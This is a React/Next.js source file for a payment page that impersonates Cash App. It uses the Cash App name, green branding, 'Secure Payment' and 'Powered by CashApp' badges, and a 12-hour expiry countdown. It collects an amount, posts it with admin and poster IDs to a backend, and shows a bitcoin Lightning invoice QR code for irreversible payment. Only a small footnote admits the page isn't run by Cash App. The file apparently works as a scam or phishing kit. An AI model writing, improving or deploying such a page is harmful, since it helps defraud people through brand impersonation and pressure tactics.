'use client';
import { useState, useEffect } from 'react';
import { FaLock, FaArrowRight, FaCheckCircle, FaCheck } from 'react-icons/fa';
import { MdVerifiedUser } from 'react-icons/md';
import { toast } from 'react-toastify';
import Cookies from 'js-cookie';
import { API_URL, site } from '../config/index';

const AMOUNTS = [10, 50, 100, 200, 300, 500];
const MORE_AMOUNTS = [750, 1000, 1500, 2000];

export default function Home({ adminId, posterId, param, param2 }) {
  const [step, setStep] = useState(1);
  const [selectedAmount, setSelectedAmount] = useState(null);
  const [customAmount, setCustomAmount] = useState('');
  const [showMore, setShowMore] = useState(false);
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60);
  const [lightningInvoice, setLightningInvoice] = useState('');
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (step >= 2 && timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [step, timeLeft]);

  const formatTime = (seconds) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, '0')}:${mins
      .toString()
      .padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handlePayNow = async () => {
    if (!selectedAmount) {
      toast.error('Select your amount');
      return;
    }
    setLoading(true);
    const fullLink =
      param && param2
        ? `https://${site}/${param}/${param2}`
        : `https://${site}`;

    const values = {
      site: fullLink,
      amount: selectedAmount,
      adminId,
    };

    try {
      const url = `${API_URL}/ad/${adminId}/${posterId}`;

      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();
      if (data && data.info && data.info.lightningInvoice) {
        setLightningInvoice(data.info.lightningInvoice);
      } else {
        setLightningInvoice('');
      }

      setLoading(false);
      setStep(2);
    } catch (error) {
      console.error('Error creating invoice:', error);
      setLightningInvoice('');
      setLoading(false);
      setStep(2);
    }
  };

  const copyLightningInvoice = async () => {
    if (!lightningInvoice) {
      toast.error('Lightning invoice is not generated yet.');
      return;
    }

    try {
      await navigator.clipboard.writeText(lightningInvoice);
      setCopied(true);
      toast.success('Invoice copied');
      setTimeout(() => setCopied(false), 2000);
    } catch {
      toast.error('Failed to copy lightning invoice.');
    }
  };

  const handleRecommendedPay = () => {
    copyLightningInvoice();
  };

  const handleAmountClick = (amt) => {
    setSelectedAmount(amt);
    setCustomAmount(amt.toString());
  };

  const handleCustomAmountChange = (e) => {
    const val = e.target.value;
    setCustomAmount(val);
    if (!isNaN(parseFloat(val))) {
      setSelectedAmount(parseFloat(val));
    }
  };

  if (step === 2) {
    return (
      <div className="min-h-screen bg-[#08080a] text-white font-sans flex flex-col justify-between px-4 py-5">
        <div className="w-full max-w-[390px] mx-auto flex justify-end">
          <div className="inline-flex items-center gap-2 rounded-full bg-white/10 border border-white/10 px-3 py-1 text-xs font-semibold text-white/80">
            <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
            <span>Expires in {formatTime(timeLeft)}</span>
          </div>
        </div>

        <main className="flex-1 flex flex-col items-center justify-center w-full max-w-[390px] mx-auto py-4 gap-4">
          <p className="text-[11px] font-bold tracking-[0.18em] text-white/60 uppercase text-center">
            HOW TO PAY IN CASH APP
          </p>

          <div className="w-full max-w-[260px] rounded-[28px] border-[3px] border-white/15 bg-black overflow-hidden shadow-2xl">
            <video
              src="/cashapp-howto.mp4"
              autoPlay
              loop
              muted
              playsInline
              className="w-full h-auto max-h-[58vh] object-contain block bg-black"
            />
          </div>

          <button
            type="button"
            onClick={() => setStep(3)}
            className="w-full h-12 rounded-full bg-white hover:bg-white/90 text-black font-bold text-[16px] transition active:scale-[0.98] shadow-lg mt-2"
          >
            Got it, next
          </button>
        </main>
      </div>
    );
  }

  if (step === 3) {
    return (
      <div className="min-h-screen bg-[#08080a] text-white font-sans flex flex-col justify-between px-4 py-5">
        <div className="w-full max-w-[390px] mx-auto flex justify-end">
          <div className="inline-flex items-center gap-2 rounded-full bg-white/10 border border-white/10 px-3 py-1 text-xs font-semibold text-white/80">
            <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
            <span>Expires in {formatTime(timeLeft)}</span>
          </div>
        </div>

        <main className="flex-1 flex flex-col items-center justify-center w-full max-w-[360px] mx-auto py-4">
          <div className="w-16 h-16 rounded-full bg-[#00D632] flex items-center justify-center text-white text-2xl font-black shadow-lg mb-3">
            c
          </div>

          <h1 className="text-[22px] font-extrabold tracking-tight text-white">
            Pay with Bitcoin
          </h1>
          <p className="text-[38px] font-black tracking-tight text-white tabular-nums leading-tight mt-1 mb-5">
            ${(selectedAmount || 0).toFixed(2)}
          </p>

          {/* QR Code Container */}
          <div className="relative mb-6 w-full max-w-[250px] mx-auto">
            <div className="absolute -inset-4 bg-[#0891b2]/15 blur-3xl rounded-full pointer-events-none" />
            <div className="relative rounded-[20px] border-[3px] border-[#08080a] bg-white p-4 shadow-2xl aspect-square flex items-center justify-center">
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(lightningInvoice || '')}`}
                alt="Payment QR"
                className="w-full h-full object-contain"
              />
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-[#00D632] w-9 h-9 rounded-xl flex items-center justify-center shadow-lg border-2 border-white">
                <span className="text-white font-black text-lg select-none">$</span>
              </div>
            </div>
          </div>

          {/* Primary Action Buttons */}
          <div className="w-full space-y-3">
            <button
              type="button"
              onClick={handleRecommendedPay}
              className="w-full h-12 rounded-full bg-[#00D632]/20 hover:bg-[#00D632]/30 text-[#00D632] font-bold text-[15px] flex items-center justify-center gap-2 transition active:scale-[0.98]"
            >
              {copied ? (
                <>
                  <FaCheck className="text-sm" />
                  <span>Copied</span>
                </>
              ) : (
                <span>Copy invoice</span>
              )}
            </button>

            <a
              href="https://cash.app/launch/bitcoin"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full h-12 rounded-full bg-white hover:bg-white/90 text-black font-bold text-[15px] flex items-center justify-center gap-2 transition active:scale-[0.98] shadow-lg"
            >
              <span>Open Cash App</span>
            </a>
          </div>

          <p className="text-xs text-white/60 text-center max-w-[290px] leading-relaxed mt-5">
            Bitcoin payments are final and can&apos;t be reversed. This page isn&apos;t run by Cash App.
          </p>

          <button
            type="button"
            onClick={() => setStep(2)}
            className="mt-3 text-[13px] font-semibold text-white/80 hover:text-white underline underline-offset-4 transition"
          >
            How to pay
          </button>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f2fcf5] font-sans text-gray-900 flex flex-col justify-between">
      {/* Top Header */}
      <header className="flex justify-between items-center px-4 py-3 md:px-8 bg-white border-b border-gray-100 shrink-0">
        <div className="flex items-center gap-2">
          <div className="bg-[#00D632] p-1.5 rounded-lg">
            <svg
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M11.8 17.7V19.2M11.8 4.8V6.3M15.4 8.7C15.4 7.4 14.3 6.3 13 6.3H10.6C9.3 6.3 8.2 7.4 8.2 8.7C8.2 10 9.3 11.1 10.6 11.1H13C14.3 11.1 15.4 12.2 15.4 13.5C15.4 14.8 14.3 15.9 13 15.9H10.6C9.3 15.9 8.2 14.8 8.2 13.5"
                stroke="white"
                strokeWidth="2.5"
                strokeLinecap="round"
              />
            </svg>
          </div>
        </div>
        <button className="flex items-center gap-1.5 text-gray-500 text-sm font-medium border border-gray-200 px-3 py-1.5 rounded-full hover:bg-gray-50 transition-colors">
          <FaLock className="text-xs" />
          <span>Secure</span>
        </button>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center py-4 px-4 overflow-hidden">
          <div className="w-full max-w-[390px] bg-white rounded-[32px] shadow-2xl border border-gray-150 p-5 md:p-6 my-auto relative overflow-hidden flex flex-col justify-between shrink-0">
            {/* Phone Speaker Notch at Top */}
            <div className="w-12 h-1 bg-gray-200 rounded-full mx-auto mb-4"></div>

            {/* Profile/App Info */}
            <div className="flex flex-col items-center mb-3">
              <div className="w-12 h-12 bg-[#00D632] rounded-full flex items-center justify-center text-white text-2xl font-bold mb-2">
                c
              </div>
              <h1 className="text-xl font-extrabold text-gray-900 mb-1">
                Cash App
              </h1>
              <div className="flex items-center gap-1 bg-[#e6fbf0] text-[#00D632] px-2.5 py-0.5 rounded-full text-[11px] font-bold border border-[#ccf7e1]">
                <FaCheckCircle className="text-[9px]" />
                <span>Secure Payment</span>
              </div>
            </div>

            {/* Thin divider line */}
            <div className="border-t border-gray-100 w-full my-3"></div>

            {/* Amount Selection Section */}
            <div className="space-y-4">
              <div className="flex items-center gap-1.5 text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-2">
                <div className="w-4 h-4 rounded-full border border-[#00D632] flex items-center justify-center text-[#00D632] text-[9px] font-black font-sans">
                  $
                </div>
                <span>SELECT AMOUNT</span>
              </div>

              {/* Amount Grid */}
              <div className="grid grid-cols-3 gap-2">
                {AMOUNTS.map((amt) => (
                  <button
                    key={amt}
                    onClick={() => handleAmountClick(amt)}
                    className={`py-2 px-1 rounded-xl border transition-all duration-200 text-sm font-extrabold ${
                      selectedAmount === amt
                        ? 'border-[#00D632] bg-[#f2fcf5] text-[#00D632]'
                        : 'border-gray-200 bg-white text-gray-900 hover:border-gray-300'
                    }`}
                  >
                    ${amt.toFixed(2)}
                  </button>
                ))}
                {showMore &&
                  MORE_AMOUNTS.map((amt) => (
                    <button
                      key={amt}
                      onClick={() => handleAmountClick(amt)}
                      className={`py-2 px-1 rounded-xl border transition-all duration-200 text-sm font-extrabold ${
                        selectedAmount === amt
                          ? 'border-[#00D632] bg-[#f2fcf5] text-[#00D632]'
                          : 'border-gray-200 bg-white text-gray-900 hover:border-gray-300'
                      }`}
                    >
                      ${amt.toFixed(2)}
                    </button>
                  ))}
              </div>

              <button
                onClick={() => setShowMore(!showMore)}
                className="w-full py-2.5 text-center text-[#00D632] font-extrabold text-xs bg-[#e6fbf0] rounded-xl hover:bg-[#ccf7e1] transition-all"
              >
                {showMore ? 'Show less amounts' : 'Show more amounts'}
              </button>

              {/* Custom Amount Input */}
              <div className="relative">
                <input
                  type="number"
                  value={customAmount}
                  onChange={handleCustomAmountChange}
                  className="w-full py-2.5 px-4 bg-white border border-gray-200 rounded-xl text-sm font-semibold outline-none focus:border-[#00D632] text-gray-700 transition-colors"
                  placeholder="Enter custom amount (min 10, max 2000)"
                />
              </div>

              {/* Pay Button */}
              <button
                onClick={handlePayNow}
                disabled={loading}
                className="w-full py-3 bg-[#00D632] hover:bg-[#00b029] text-white font-extrabold rounded-full text-base flex items-center justify-center gap-2 transition-all disabled:opacity-50 shadow-md shadow-green-100"
              >
                <FaLock className="text-xs opacity-90" />
                <span>Pay Now</span>
                <FaArrowRight className="text-xs opacity-90" />
              </button>

              {loading && (
                <div className="flex items-center justify-center gap-3 py-1">
                  <div className="w-4 h-4 border-2 border-[#00D632] border-t-transparent rounded-full animate-spin"></div>
                  <span className="text-xs font-semibold text-[#00D632]">
                    Creating invoice...
                  </span>
                </div>
              )}
            </div>

            {/* Thin divider line */}
            <div className="border-t border-gray-100 w-full my-3"></div>

            {/* Card Footer */}
            <div className="text-center pb-1">
              <p className="text-[10px] font-extrabold text-gray-400 uppercase tracking-widest">
                Powered by CashApp
              </p>
            </div>

            {/* Bottom Neon Accent Line */}
            <div className="absolute bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-[#00D632] to-transparent opacity-40"></div>
          </div>
      </main>

      {/* Decorative Bottom Bar (Phone like) */}
      <div className="fixed bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-[#00D632] to-transparent opacity-30"></div>
    </div>
  );
}
